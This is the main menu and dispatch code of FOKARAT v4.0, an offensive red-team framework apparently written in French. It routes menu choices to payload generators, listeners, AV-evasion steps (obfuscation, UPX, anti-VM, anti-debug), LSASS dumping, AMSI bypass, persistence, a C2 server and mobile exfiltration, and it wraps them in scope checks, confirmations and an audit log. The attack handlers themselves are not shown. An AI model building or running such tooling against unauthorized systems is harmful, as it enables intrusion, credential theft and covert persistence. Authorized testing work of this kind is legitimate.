    if path and os.path.exists(path):
        with open(path) as f: code = f.read()
        out = path.replace(".c", "_antidbg.c")
        with open(out, "w") as f: f.write(AntiDebugGenerator().wrap(code))
        logger.success(f"Anti-Debug : {out}")


def handle_report():
    path = db.export_report()
    print(f"\n  {C.GRN}Rapport : {path}{C.R}\n")
    with open(path) as f: print(f.read())


def handle_mitre_report():
    af = "output/audit.log"
    if not os.path.exists(af):
        logger.warning("Aucune action."); return
    action_map = {
        "PDF_REPORT_GENERATED": "reporting",
        "FINDING_ADDED": "reporting",
        "C2_STARTED": "application_layer_protocol",
        "WIN_ENUM": "system_information_discovery",
        "LSASS_DUMP": "os_credential_dumping",
        "AMSI_BYPASS": "impair_defenses",
    }
    actions = set()
    with open(af) as f:
        for line in f:
            try:
                e = json.loads(line)
                if e.get("action") in action_map:
                    actions.add(action_map[e["action"]])
            except: pass
    if not actions:
        logger.warning("Aucune action MITRE."); return
    content = mitre.generate_report(list(actions))
    out = "output/mitre_report.md"
    with open(out, "w") as f: f.write(content)
    logger.success(f"Rapport MITRE : {out}")
    print(f"\n{content}\n")


def handle_mitre_navigator():
    handle_mitre_report()


def handle_web_api():
    if not os.environ.get("FOKARAT_API_USER") or not os.environ.get("FOKARAT_API_PASS"):
        logger.error("Variables d'env manquantes."); return
    try:
        from web.api import start_web
        start_web(host="127.0.0.1", port=5000)
    except ImportError:
        logger.error("pip install fastapi uvicorn python-jose")


def handle_scope():
    clear()
    existing = scope_validator.load_scope()
    if existing:
        print(f"  Scope actif : {existing['target']}")
        if input(f"  Remplacer ? (o/n) : ").strip().lower() != "o":
            return
    scope_validator.require_scope()


def handle_dry_run():
    if ethics.dry_run: ethics.disable_dry_run()
    else: ethics.enable_dry_run()


def handle_audit_log():
    clear()
    print(f"\n  {C.B}{C.CYN}═══ AUDIT ═══{C.R}\n")
    af = "output/audit.log"
    if not os.path.exists(af):
        logger.info("Aucun log."); return
    with open(af) as f: lines = f.readlines()
    print(f"  {len(lines)} entrée(s)\n")
    for line in lines[-30:]:
        try:
            e = json.loads(line)
            print(f"  [{e['timestamp'][:19]}] {e['action']} : {e.get('details', '')}")
        except: pass


def handle_list_plugins():
    clear()
    print(f"\n  {C.B}{C.PNK}═══ PLUGINS ═══{C.R}\n")
    plugins = plugin_loader.list_plugins()
    if not plugins: logger.info("Aucun plugin."); return
    for i, p in enumerate(plugins, 1):
        m = p.metadata
        print(f"  [{i}] {m.name} v{m.version} ({m.category})")
        print(f"      {m.description}\n")


def handle_run_plugin():
    plugins = plugin_loader.list_plugins()
    if not plugins: logger.info("Aucun plugin."); return
    for i, p in enumerate(plugins, 1): print(f"    [{i}] {p.metadata.name}")
    try:
        c = int(input(f"  Choix : ").strip())
        plugin = plugins[c - 1]
    except (ValueError, IndexError):
        logger.error("Invalide."); return
    args = {}
    if plugin.metadata.requires_scope:
        args["target"] = input(f"  Cible : ").strip()
    if not ethics.confirm_action(f"Exécuter {plugin.metadata.name}"): return
    try:
        logger.success(f"Résultat : {plugin.run(config, args=args if args else None)}")
    except ScopeError as e:
        logger.error(f"❌ SCOPE REFUSÉ : {e}")
    except Exception as e:
        logger.error(f"Erreur : {e}")


def handle_reload_plugins():
    plugin_loader.unload_all()
    n = plugin_loader.load_all()
    logger.success(f"{n} plugin(s) rechargé(s)")


def handle_encrypt_file():
    path = input(f"  Fichier : ").strip()
    if path and os.path.exists(path): crypto.encrypt_file(path)


def handle_decrypt_file():
    path = input(f"  .enc : ").strip()
    if path and os.path.exists(path):
        try:
            c = crypto.decrypt_file(path)
            out = path.replace(".enc", ".dec")
            with open(out, "w") as f: f.write(c)
            logger.success(f"Déchiffré : {out}")
        except Exception as e:
            logger.error(f"Échec : {e}")


def handle_test_sandbox():
    for k, v in sandbox.limits.items(): print(f"    {k} = {v}")
    cmd = input(f"  Commande [echo hi] : ").strip() or "echo hi"
    r = sandbox.run(cmd)
    print(f"\n  Status : {r['status']} | Durée : {r['duration']}s")


def handle_jwt_token():
    try:
        from web.auth import jwt_manager
        u = os.environ.get("FOKARAT_API_USER")
        if not u: logger.error("FOKARAT_API_USER non défini."); return
        print(f"\n  Token : {jwt_manager.create_token(u, expiry=3600)}\n")
    except ImportError as e:
        logger.error(f"Erreur : {e}")


def handle_webhook_add():
    try:
        from web.webhooks import webhook_manager
        url = input(f"  URL : ").strip()
        if url: webhook_manager.add_hook(url)
    except ImportError as e:
        logger.error(f"Erreur : {e}")


def main():
    boot_animation()
    time.sleep(0.3)
    scope_validator.load_scope()
    plugin_loader.load_all()

    while True:
        show_menu()
        choice = input(f"  {C.B}{C.MAG}╰─▶{C.R} {C.B}FOKARAT{C.R} {C.YEL}>{C.R} ").strip()

        try:
            if choice == "01":
                if ethics.confirm_action("Payload Python"): PythonPayloadGenerator().run(config)
            elif choice == "02":
                if ethics.confirm_action("Payload C++"): CppPayloadGenerator().run(config)
            elif choice == "03":
                if ethics.confirm_action("Payload MSFVenom"): MsfvenomGenerator().run(config)
            elif choice == "04": listener.start_ncat(config)
            elif choice == "05": listener.start_msf(config)
            elif choice == "06": listener.stop_all()
            elif choice == "07": http_server.run(config); continue
            elif choice == "08":
                if ethics.confirm_action("DuckyScript"): BadUSBGenerator().run(config)
            elif choice == "09": DuckEncoder().run(config)
            elif choice == "10":
                if ethics.confirm_action("Flash USB"): USBFlasher().run(config)
            elif choice == "14":
                ip = input(f"  LHOST [{config.get('lhost')}] : ").strip()
                if ip: config.set("lhost", ip)
                p = input(f"  LPORT [{config.get('lport')}] : ").strip()
                if p.isdigit(): config.set("lport", int(p))
            elif choice == "15":
                if config.save(): logger.success("Sauvegardée.")
            elif choice == "16":
                if which("msfconsole"): os.system("msfconsole")
            elif choice == "17": check_dependencies(); continue
            elif choice == "18":
                clear(); animated_banner()
                print(f"  {C.B}{C.GRN}FOKARAT v4.0{C.R}\n  Lwano Amissi Blanchard (FOKAS)\n")
            elif choice == "19":
                listener.stop_all(); plugin_loader.unload_all()
                if c2_server and c2_server.running: c2_server.stop()
                typewriter(f"\n  {C.GRN}À bientôt !{C.R}", 0.02); print(); break
            elif choice == "20": handle_padding()
            elif choice == "21": handle_python_obfuscation()
            elif choice == "22": handle_upx()
            elif choice == "23": handle_multi_encoder()
            elif choice == "24": handle_anti_vm()
            elif choice == "25": handle_anti_debug()
            elif choice == "26": handle_report()
            elif choice == "27": handle_web_api(); continue
            elif choice == "30": handle_scope()
            elif choice == "31": handle_dry_run()
            elif choice == "32": handle_audit_log()
            elif choice == "33": handle_mitre_report()
            elif choice == "34": handle_mitre_navigator()
            elif choice == "40": handle_list_plugins()
            elif choice == "41": handle_run_plugin()
            elif choice == "42": handle_reload_plugins()
            elif choice == "50": handle_encrypt_file()
            elif choice == "51": handle_decrypt_file()
            elif choice == "52": handle_test_sandbox()
            elif choice == "53": handle_jwt_token()
            elif choice == "54": handle_webhook_add()
            # Sprint 7
            elif choice == "60": handle_enum_windows()
            elif choice == "61": handle_lsass_dump()
            elif choice == "62": handle_persistence_win()
            elif choice == "63": handle_amsi_bypass()
            elif choice == "64": handle_lateral_win()
            # Sprint 8
            elif choice == "70": handle_enum_linux()
            elif choice == "71": handle_privesc_linux()
            elif choice == "72": handle_persistence_linux()
            elif choice == "73": handle_credentials_linux()
            elif choice == "74": handle_lateral_linux()
            # Sprint 9
            elif choice == "80": handle_c2_start()
            elif choice == "81": handle_c2_agent()
            elif choice == "82": handle_c2_pivot()
            elif choice == "83": handle_c2_sessions()
            elif choice == "84": handle_c2_send_command()
            # Sprint 10
            elif choice == "90": handle_android_enum()
            elif choice == "91": handle_android_persistence()
            elif choice == "92": handle_android_credentials()
            elif choice == "93": handle_android_privesc()
            elif choice == "94": handle_android_exfil()
            elif choice == "95": handle_ios_enum()
            elif choice == "96": handle_ios_jailbreak_check()
            elif choice == "97": handle_ios_persistence()
            elif choice == "98": handle_ios_credentials()
            elif choice == "99": handle_ios_jailbreak_guide()
            # Sprint 11
            elif choice == "100": handle_add_finding()
            elif choice == "101": handle_list_findings()
            elif choice == "102": handle_generate_pdf()
            elif choice == "103": handle_generate_exec_summary()
            elif choice == "104": handle_list_cvss_presets()
            elif choice == "105": handle_remove_finding()
            else:
                logger.warning("Choix invalide.")
        except KeyboardInterrupt:
            print(); logger.warning("Interrompu.")
        except ScopeError as e:
            logger.error(f"❌ SCOPE REFUSÉ : {e}")
        except Exception as e:
            logger.error(f"Erreur : {e}")

        input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        listener.stop_all()
        plugin_loader.unload_all()
        if c2_server and c2_server.running:
            c2_server.stop()
        print(f"\n{C.RED}[!] Sortie.{C.R}")